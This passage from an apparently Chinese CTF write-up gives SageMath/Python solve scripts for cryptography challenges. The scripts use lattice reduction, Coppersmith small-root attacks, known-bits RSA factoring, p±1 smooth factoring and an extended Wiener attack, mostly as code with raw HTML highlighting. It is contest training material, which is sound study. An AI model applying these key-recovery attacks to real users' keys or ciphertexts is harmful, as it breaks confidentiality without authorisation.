class="hljs-number">38614</span>*x^<span class="hljs-number">47</span> + <span class="hljs-number">5528</span>*x^<span class="hljs-number">46</span> + <span class="hljs-number">20119</span>*x^<span class="hljs-number">45</span> + <span class="hljs-number">13439</span>*x^<span class="hljs-number">44</span> + <span class="hljs-number">25468</span>*x^<span class="hljs-number">43</span> + <span class="hljs-number">30056</span>*x^<span class="hljs-number">42</span> + <span class="hljs-number">19720</span>*x^<span class="hljs-number">41</span> + <span class="hljs-number">21808</span>*x^<span class="hljs-number">40</span> + <span class="hljs-number">3712</span>*x^<span class="hljs-number">39</span> + <span class="hljs-number">25243</span>*x^<span class="hljs-number">38</span> + <span class="hljs-number">10606</span>*x^<span class="hljs-number">37</span> + <span class="hljs-number">16247</span>*x^<span class="hljs-number">36</span> + <span class="hljs-number">36106</span>*x^<span class="hljs-number">35</span> + <span class="hljs-number">17287</span>*x^<span class="hljs-number">34</span> + <span class="hljs-number">36276</span>*x^<span class="hljs-number">33</span> + <span class="hljs-number">1407</span>*x^<span class="hljs-number">32</span> + <span class="hljs-number">28839</span>*x^<span class="hljs-number">31</span> + <span class="hljs-number">8459</span>*x^<span class="hljs-number">30</span> + <span class="hljs-number">38863</span>*x^<span class="hljs-number">29</span> + <span class="hljs-number">435</span>*x^<span class="hljs-number">28</span> + <span class="hljs-number">913</span>*x^<span class="hljs-number">27</span> + <span class="hljs-number">36619</span>*x^<span class="hljs-number">26</span> + <span class="hljs-number">15572</span>*x^<span class="hljs-number">25</span> + <span class="hljs-number">9363</span>*x^<span class="hljs-number">24</span> + <span class="hljs-number">36837</span>*x^<span class="hljs-number">23</span> + <span class="hljs-number">17925</span>*x^<span class="hljs-number">22</span> + <span class="hljs-number">38567</span>*x^<span class="hljs-number">21</span> + <span class="hljs-number">38709</span>*x^<span class="hljs-number">20</span> + <span class="hljs-number">13582</span>*x^<span class="hljs-number">19</span> + <span class="hljs-number">35038</span>*x^<span class="hljs-number">18</span> + <span class="hljs-number">31121</span>*x^<span class="hljs-number">17</span> + <span class="hljs-number">8933</span>*x^<span class="hljs-number">16</span> + <span class="hljs-number">1666</span>*x^<span class="hljs-number">15</span> + <span class="hljs-number">21940</span>*x^<span class="hljs-number">14</span> + <span class="hljs-number">25585</span>*x^<span class="hljs-number">13</span> + <span class="hljs-number">840</span>*x^<span class="hljs-number">12</span> + <span class="hljs-number">21938</span>*x^<span class="hljs-number">11</span> + <span class="hljs-number">20143</span>*x^<span class="hljs-number">10</span> + <span class="hljs-number">28507</span>*x^<span class="hljs-number">9</span> + <span class="hljs-number">5947</span>*x^<span class="hljs-number">8</span> + <span class="hljs-number">20289</span>*x^<span class="hljs-number">7</span> + <span class="hljs-number">32196</span>*x^<span class="hljs-number">6</span> + <span class="hljs-number">924</span>*x^<span class="hljs-number">5</span> + <span class="hljs-number">370</span>*x^<span class="hljs-number">4</span> + <span class="hljs-number">14849</span>*x^<span class="hljs-number">3</span> + <span class="hljs-number">10780</span>*x^<span class="hljs-number">2</span> + <span class="hljs-number">14035</span>*x + <span class="hljs-number">15327</span><br>m=C^d<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> m:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(i)),end=<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="Raven">Raven</h2><p>挺有意思的一个题目，多项式的系数都比较小。所以可以看作是一个6次的一元多项式。造格子出系数（不过不知道为啥d不能直接出，这里是先出a,b,c。再单独二元copper求d）。</p><p>涉及到格基规约和二元coppersimth，较为复杂，先自行研究。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">p</span> = <br><span class="hljs-attribute">pairs</span> = <br><br><span class="hljs-attribute">K</span>=<span class="hljs-number">2</span>**<span class="hljs-number">520</span><br><span class="hljs-attribute">M</span>=[[<span class="hljs-number">0</span> for i in range(<span class="hljs-number">12</span>)] for j in range(<span class="hljs-number">12</span>)]  #M=[[<span class="hljs-number">0</span>]*<span class="hljs-number">12</span>]*<span class="hljs-number">12</span><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">4</span>):<br>    <span class="hljs-attribute">for</span> j in range(<span class="hljs-number">7</span>):<br>        <span class="hljs-attribute">M</span>[j][i]=p-pow(pairs[i][<span class="hljs-number">0</span>],<span class="hljs-number">6</span>-j,p)<br>    <span class="hljs-attribute">M</span>[<span class="hljs-number">7</span>+i][i]=p<br>    <span class="hljs-attribute">M</span>[<span class="hljs-number">11</span>][i]=pairs[i][<span class="hljs-number">1</span>]<br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">7</span>):<br>    <span class="hljs-attribute">M</span>[i][<span class="hljs-number">4</span>+i]=<span class="hljs-number">1</span><br><span class="hljs-attribute">M</span>[-<span class="hljs-number">1</span>][-<span class="hljs-number">1</span>]=K<br><span class="hljs-attribute">M</span>=Matrix(M)<br><span class="hljs-attribute">L</span>=M.LLL()<br><span class="hljs-attribute">for</span> i in L:<br>    <span class="hljs-attribute">if</span> int(i[-<span class="hljs-number">1</span>])==K:<br>        <span class="hljs-attribute">print</span>(i)<br>        <span class="hljs-attribute">sol</span>=i*M^-<span class="hljs-number">1</span><br><span class="hljs-attribute">sol</span>=[int(i) for i in sol[:<span class="hljs-number">7</span>]]<br><span class="hljs-attribute">print</span>(sol)<br><span class="hljs-attribute">from</span> gmpy2 import *<br><span class="hljs-attribute">a</span>=int(iroot(sol[<span class="hljs-number">0</span>],<span class="hljs-number">2</span>)[<span class="hljs-number">0</span>])<br><span class="hljs-attribute">b</span>=sol[<span class="hljs-number">1</span>]//(<span class="hljs-number">2</span>*a)<br><span class="hljs-attribute">c</span>=(sol[<span class="hljs-number">2</span>]-b*b)//(<span class="hljs-number">2</span>*a)<br><span class="hljs-attribute">print</span>(a,b,c)<br><span class="hljs-comment">#d=256836945952994885035467059118377791095</span><br><br></code></pre></td></tr></table></figure><p>二元coppersmith恢复key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> itertools<br><br><br><span class="hljs-comment"># 一种求多项式小根问题的方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">small_roots</span>(<span class="hljs-params">f, bounds, m=<span class="hljs-number">1</span>, d=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> d:<br>        d = f.degree()<br><br>    R = f.base_ring()<br>    N = R.cardinality()<br><br>    f /= f.coefficients().pop(<span class="hljs-number">0</span>)<br>    f = f.change_ring(ZZ)<br><br>    G = <span class="hljs-type">Sequence</span>([], f.parent())<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m + <span class="hljs-number">1</span>):<br>        base = N ^ (m - i) * f ^ i<br>        <span class="hljs-keyword">for</span> shifts <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(d), repeat=f.nvariables()):<br>            g = base * prod(<span class="hljs-built_in">map</span>(power, f.variables(), shifts))<br>            G.append(g)<br><br>    B, monomials = G.coefficient_matrix()<br>    monomials = vector(monomials)<br><br>    factors = [monomial(*bounds) <span class="hljs-keyword">for</span> monomial <span class="hljs-keyword">in</span> monomials]<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, factor)<br><br>    B = B.dense_matrix().LLL()<br><br>    B = B.change_ring(QQ)<br>    <span class="hljs-keyword">for</span> i, factor <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(factors):<br>        B.rescale_col(i, <span class="hljs-number">1</span> / factor)<br><br>    H = <span class="hljs-type">Sequence</span>([], f.parent().change_ring(QQ))<br>    <span class="hljs-keyword">for</span> h <span class="hljs-keyword">in</span> <span class="hljs-built_in">filter</span>(<span class="hljs-literal">None</span>, B * monomials):<br>        H.append(h)<br>        I = H.ideal()<br>        <span class="hljs-keyword">if</span> I.dimension() == -<span class="hljs-number">1</span>:<br>            H.pop()<br>        <span class="hljs-keyword">elif</span> I.dimension() == <span class="hljs-number">0</span>:<br>            roots = []<br>            <span class="hljs-keyword">for</span> root <span class="hljs-keyword">in</span> I.variety(ring=ZZ):<br>                root = <span class="hljs-built_in">tuple</span>(R(root[var]) <span class="hljs-keyword">for</span> var <span class="hljs-keyword">in</span> f.variables())<br>                roots.append(root)<br>            <span class="hljs-keyword">return</span> roots<br><br>    <span class="hljs-keyword">return</span> []<br><br>r3=<span class="hljs-number">38110026992499584203762396049303607649993098725357412914752750999593537061009</span><br>x3=<span class="hljs-number">68711183101845981499596464753252121346970486988311398916877579778110690480447199642602267233989256728822535174215153145632158860662954277116345331672194812126361911061449082917955000137698138358926301360506687271134873</span><br>y3=<span class="hljs-number">995428771589393162202488762223106955302099250561593105620410424291405842350539887383005328242236156038373244928147473800972534658018117705291472213770335998508454938607290279268848513727721410314612261163489156360908800</span><br>p=<span class="hljs-number">1018551160851728231474335384388576586031917743463656622083024684199383855595168341728561337234276243780407755294430553694832049089534855113774546001494743212076463713621965520780122783825100696968959866614846174188401153</span><br><br>a,b,c=(<span class="hljs-number">248509346369130391242170998803167584710</span>,<span class="hljs-number">34130269465266010935033619912669159600</span>,<span class="hljs-number">190347116220905792012773821811284452644</span>)<br>A=a*x3*x3*x3+b*x3*x3+c*x3<br><span class="hljs-comment"># 设置一个基于整数环的多项式,一元或者多元</span><br>P.&lt; x, y &gt;= PolynomialRing(Zmod(p))<br><span class="hljs-comment"># f为多项式</span><br>f = (A+x)*(A+x)+y-y3<br><span class="hljs-comment"># bounds为根的最大值,粗略范围即可</span><br>bounds =(<span class="hljs-number">2</span>^<span class="hljs-number">128</span>,<span class="hljs-number">2</span>^<span class="hljs-number">256</span>)<br><span class="hljs-comment"># m,d选填</span><br>m = <span class="hljs-number">3</span><br>d = <span class="hljs-number">4</span><br>roots = small_roots(f, bounds, m, d)<br><span class="hljs-built_in">print</span>(roots)<br></code></pre></td></tr></table></figure><p>解AES</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nix">from Crypto.Util.number <span class="hljs-built_in">import</span> <span class="hljs-operator">*</span><br>from Crypto.Cipher <span class="hljs-built_in">import</span> AES<br><br><span class="hljs-attr">key</span><span class="hljs-operator">=</span><span class="hljs-number">256836945952994885035467059118377791095</span><br>c<span class="hljs-attr">ipher</span> <span class="hljs-operator">=</span> AES.new(key<span class="hljs-operator">=</span>long_to_bytes(key), IV<span class="hljs-operator">=</span>bytes(range(<span class="hljs-number">16</span>)), mode<span class="hljs-operator">=</span>AES.MODE_CBC)<br><br><span class="hljs-attr">ct</span> <span class="hljs-operator">=</span> b<span class="hljs-string">&quot;|2<span class="hljs-char escape_">\x</span>f0v7<span class="hljs-char escape_">\x</span>05Y<span class="hljs-char escape_">\x</span>89<span class="hljs-char escape_">\r</span>]<span class="hljs-char escape_">\x</span>e93s<span class="hljs-char escape_">\r</span>r)#3<span class="hljs-char escape_">\x</span>e9<span class="hljs-char escape_">\x</span>90%Z<span class="hljs-char escape_">\x</span>9a<span class="hljs-char escape_">\x</span>d9<span class="hljs-char escape_">\x</span>9ck<span class="hljs-char escape_">\x</span>ba<span class="hljs-char escape_">\x</span>ec]q<span class="hljs-char escape_">\x</span>b8<span class="hljs-char escape_">\x</span>f2&#x27;<span class="hljs-char escape_">\x</span>c8e~fL<span class="hljs-char escape_">\x</span>cf<span class="hljs-char escape_">\x</span>93<span class="hljs-char escape_">\x</span>00<span class="hljs-char escape_">\x</span>d6^s-<span class="hljs-char escape_">\x</span>c9<span class="hljs-char escape_">\x</span>d6M&quot;</span><br>print(cipher.decrypt(ct))<br></code></pre></td></tr></table></figure><h2 id="easy-high">easy_high</h2><p>考点：</p><ol><li>异或</li><li>已知p的部分比特的coppersmith攻击</li></ol><p>参考学习coppersmith攻击的经典应用：已知p的部分比特，已知部分明文，已知部分私钥低位等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">p0=<span class="hljs-number">149263925308155304734002881595820602641174737629551638146384199378753884153459661375931646716325020758837194837271581361322079811468970876532640273110966545339040194118880506352109559900553776706613338890047890747811129988585025948270181264314668772556874718178868209009192010129918138140332707080927643141811</span><br><br>p1=p0%(<span class="hljs-number">2</span>**<span class="hljs-number">444</span>)  <span class="hljs-comment">#低位</span><br>b=p0.bit_length()-<span class="hljs-number">250</span><br>p2=(p0&gt;&gt;b)&lt;&lt;b<br>N=<span class="hljs-number">17192509201635459965397076685948071839556595198733884616568925970608227408244870123644193452116734188924766414178232653941867668088060274364830452998991993756231372252367134508712447410029668020439498980619263308413952840568602285764163331028384281840387206878673090608323292785024372223569438874557728414737773416206032540038861064700108597448191546413236875600906013508022023794395360001242071569785940215873854748631691555516626235191098174739613181230094797844414203694879874212340812119576042962565179579136753839946922829803044355134086779223242080575811804564731938746051591474236147749401914216734714709281349</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">PR.&lt; x &gt; = PolynomialRing(Zmod(N))</span><br><span class="hljs-string">f = p1+p2+x*2^444</span><br><span class="hljs-string">f=f.monic()</span><br><span class="hljs-string">x0 = f.small_roots(X=2 ^ 340, beta=0.4)[0]</span><br><span class="hljs-string">print(x0)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>x0=<span class="hljs-number">1414640121010865756473118885903739629697184780736973873076436168814438323477468170166972852648894898</span><br>p=p1+p2+x0*<span class="hljs-number">2</span>**<span class="hljs-number">444</span><br>q=N//p<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>d=invert(<span class="hljs-number">65537</span>,phi)<br>c=<span class="hljs-number">4881545863615247924697512170011400857004555681758106351259776881249360423774694437921554056529064037535796844084045263140567168171628832384672612945806728465127954937293787045302307135365408938448006548465000663247116917564500525499976139556325841597810084111303039525833367199565266613007333465332710833102978756654324956219855687611590278570749890543277201538208370370097424105751568285050703167350889953331829275262932104042040526209179357770495596739361176548337593674366015027648541293309465113202672923556991818236011769228078267484362980348613669012975963468592763463397575879215173972436831753615524193609612</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(c,d,N)))<br></code></pre></td></tr></table></figure><h2 id="eZ-LargeCG">eZ_LargeCG</h2><p>考点</p><ol><li><p>p+1光滑</p></li><li><p>p-1光滑</p></li><li><p>线性递推-&gt;矩阵快速幂</p></li></ol><p>可以参考<a href="http://striving.mapleice.top/index.php/archives/141/%E7%AC%AC%E5%9B%9B%E9%A2%98%E5%AD%A6%E4%B9%A0">http://striving.mapleice.top/index.php/archives/141/第四题学习</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#p-1光滑</span><br><span class="hljs-string">python primefac -vs -m=p-1 xxx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p=<span class="hljs-number">427721675251610827084310512123962488210068003845592404231631542730839819224381</span><br>n1=<span class="hljs-number">39755206609675677517559022219519767646524455449142889144073217274247893104711318356648198334858966762944109142752432641040037415587397244438634301062818169</span><br>q=n1//p<br>q1=<span class="hljs-built_in">max</span>(p,q)<br>p1=<span class="hljs-built_in">min</span>(p,q)<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">#p+1光滑</span><br><span class="hljs-string">python primefac -vs -m=p+1 xxx</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>p=<span class="hljs-number">106481130516780473105954611077340189174861459077145246394800660809527032990637</span><br>q=<span class="hljs-number">288551157776490110472645044398395422160196115791981535735903775378294599329633</span><br>q2=<span class="hljs-built_in">max</span>(p,q)<br>p2=<span class="hljs-built_in">min</span>(p,q)<br><br><span class="hljs-comment">#线性递推 快速幂</span><br>r = <span class="hljs-number">7948275435515074902473978567170931671982245044864706132834233483354166398627204583162848756424199888842910697874390403881343013872330344844971750121043493</span><br>A = <span class="hljs-number">6085327340671394838391386566774092636784105046872311226269065664501131836034666722102264842236327898770287752026397099940098916322051606027565395747098434</span><br>B = <span class="hljs-number">1385551782355619987198268805270109182589006873371541520953112424858566073422289235930944613836387546298080386848159955053303343649615385527645536504580787</span><br>C = <span class="hljs-number">2529291156468264643335767070801583140819639532551726975314270127875306069067016825677707064451364791677536138503947465612206191051563106705150921639560469</span><br><br>a,b,c,d=p1,q1,p2,q2<br>M=matrix(Zmod(r),[[c,b,a,<span class="hljs-number">1</span>],<br>                  [<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],<br>                  [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],<br>                  [<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>]])<br>N=matrix(Zmod(r),[[C,B,A,d]])<br>N=N.T<br>nn=<span class="hljs-number">6</span>**<span class="hljs-number">666</span><br>M=M^nn<br><span class="hljs-built_in">print</span>(M^-<span class="hljs-number">1</span>*N)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-number">718268686893438084080386300782696916434605242000201123193568557324202508308322958959518435405441886593296740</span>-<span class="hljs-number">2023</span>))<br></code></pre></td></tr></table></figure><h2 id="complex-matrix">complex_matrix</h2><p>考点：</p><ol><li>扩展维纳攻击（四维）</li></ol><p>可以参考<a href="https://huangx607087.online/2021/03/01/LatticeNotes6/%E5%AD%A6%E4%B9%A0">https://huangx607087.online/2021/03/01/LatticeNotes6/学习</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n = <span class="hljs-number">71841248095369087024928175623295380241516644434969868335504061065977014103487197287619667598363486210886674500469383623511906399909335989202774281795855975972913438448899231650449810696539722877903606541112937729384851506921675290984316325565141178015123381439392534417225128922398194700511937668809140024838070124095703585627058463137549632965723304713166804084673075651182998654091113119667582720831809458721072371364839503563819080226784026253</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">39297018404565022956251803918747154798377576057123078716166221329195959669756819453426741569480551313085435037629493881038383709458043802420338889323233368852331387845200216275712388921820794980987541224782392553528127093154957890356084331463340193478391679540506421250562554424770350351514435220782124981277580072039637811543914983033300225131364246910828188727043248991987332274929827173923543187017105236008487756190002204169623313222748976369</span><br>e1, e2, e3, e4 = (<br><span class="hljs-number">65128799196671634905309494529154568614228788035735808211836905142007976099865571126946706559109393187772126407982007858423859147772762638898854472065889939549916077695303157760259717113616428849798058080633047516455513870697383339784816006154279428812359241282979297285283850338964993773227397528608557211742425548651971558377656644211835094019462699301650412862894391885325969143805924684662849869947172175608502179438901337558870349697233790535</span>,<br><span class="hljs-number">58756559706647121529575085912021603170286163639572075337348109911506627489265537716060463072086480156516641723700802217411122982693536541892986623158818442274840863016647800896033363360822503445344748132842451806511693779600370832206455202293028402486647422212959763287987847280322100701242139127654031151565924132562837893975505159702015125483479126108892709063135006366792197127007229210558758401679638300464111782814561428899998471531067163715</span>,<br><span class="hljs-number">34828685390969672139784723764579499920301439564705391196519314224159563070870933754477650614819514127121146216049444888554338415587165719098661141454627820126445291802801256297252654045398330613075575527685542980264993711077876535643646746742646371967302159565887123638001580042027272379341650995728849759541960087953160211696369079708787543303742132161742979856720539914370868829868891655221361545648778590685232034703220732697083024449894197969</span>,<br><span class="hljs-number">26717968456600556973167180286909817773394160817933525240720067057464671317174201540556176814203780603153696663101158205367554829261808020426363683474848952397963507069306452835776851274959389849223566030857588019845781623271395012194869024566879791449466064832273531795430185178486425688475688634844530106740480643866537205900809400383304665727460014210405339697947582657505028211149470787536144302545259243549176816653560626044921521516818788487</span>)<br><br>A = [<br>    [<span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">4</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, n ^ <span class="hljs-number">2</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -n],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, -n, n ^ <span class="hljs-number">2</span>, -n, n ^ <span class="hljs-number">2</span>, n ^ <span class="hljs-number">2</span>, -n ^ <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, -n, <span class="hljs-number">0</span>, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -n, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, -n, n ^ <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span 